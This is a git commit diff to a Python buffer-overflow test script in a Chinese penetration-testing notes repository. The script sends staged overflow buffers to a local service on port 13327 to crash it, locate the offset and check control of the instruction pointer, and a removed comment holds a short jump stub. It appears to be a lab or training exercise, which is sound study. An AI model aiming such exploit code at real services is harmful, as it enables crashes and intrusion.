b857dd42787ce3f8e700795b71de8c5b77eb3d0b
q1145808079 <60178580+q1145808079@users.noreply.github.com>
2020-08-31 11:44:11 +0800

    2020.8.31 更新大量内容

--- Linux渗透命令/缓冲区溢出测试脚本.py
+++ Linux渗透命令/缓冲区溢出测试脚本.py
@@ -1,33 +1,7 @@
 import socket
-def first():
+def main(crash):
     host = "127.0.0.1"
-    crash = "\x41" * 4379  # \x41是ASCII码代表"A" 4379是判断多少个字符能使程序发生缓冲区溢出
-    buffer = "\x11(setup sound" + crash + "\x90\x00#"
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    print("[*]Sending evil buffer...")
-    s.connect((host, 13327))  # host后面是连接的端口号
-    data = s.recv(1024)
-    print(data)
-    s.send(buffer)
-    s.close()
-    print("[*]Payload sent")
-def second():
-    host = "127.0.0.1"
-    crash = ""  # crash的值是大量的不重复的字母数字组合用于精确确定位置
-    buffer = "\x11(setup sound" + crash + "\x90\x00#"
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    print("[*]Sending evil buffer...")
-    s.connect((host, 13327))  # host后面是连接的端口号
-    data = s.recv(1024)
-    print(data)
-    s.send(buffer)
-    s.close()
-    print("[*]Payload sent")
-def third():
-    host = "127.0.0.1"
-    crash = 'A' * 4368 + 'B' * 4 + 'C' * 7  # 用于验证是否执行了该4个字符
-    # crash = 'A'*4368 + 'B' * 4 + '\x83\xc0\x0c\xff\xe0\x90\x90'
-    buffer = "\x11(setup sound" + crash + "\x90\x00#"
+    buffer = "\x11(setup sound " +crash+ "\x90\x90#)"
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     print("[*]Sending evil buffer...")
     s.connect((host, 13327))  # host后面是连接的端口号
@@ -39,10 +13,10 @@ def third():
 if __name__ == '__main__':
     choice = input("输入使用阶段1/2/3")
     if choice == "1":
-        first()
+        main(crash="\x41" * 4379)
     elif choice == "2":
-        second()
+        main(crash="4379个不重复字符")
     elif choice == "3":
-        third()
+        main(crash="\x41" * 4368 + "B" * 4 + "C" * 7)
     else:
         print("输入错误")
